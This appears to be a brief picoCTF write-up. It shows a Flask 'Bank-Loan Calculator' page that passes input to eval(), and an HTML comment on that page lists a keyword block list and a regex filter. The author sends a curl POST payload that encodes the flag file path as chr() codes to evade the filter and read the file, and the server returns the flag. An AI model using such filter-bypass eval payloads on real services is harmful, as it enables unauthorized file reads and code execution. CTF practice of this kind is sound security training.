
```
▶ curl http://shape-facility.picoctf.net:62834/                                                                                           
<!DOCTYPE html>
<html lang="en">
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```

eval() is a bundled function that execute text code as python code. 

```
▶ curl -X POST http://shape-facility.picoctf.net:52503/execute -d "code=open(''.join([chr(x) for x in [47, 102, 108, 97, 103, 46, 116, 120, 116]])).read()"

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Execution Result</title>
    <link rel="stylesheet" href="/static/bootstrap.min.css">
    <link rel="stylesheet" href="/static/styles.css">
</head>
<body>
    <div class="container">
        <h1 class="mb-4 text-center">Bank-Loan Calculator</h1>
        <div class="result">
            <p>Result: picoCTF{CCCCCCCCCCCCCCCCCCCCCCCCC}</p>
            <a href="/">Go back</a>
        </div>
    </div>
</body>
</html>
```
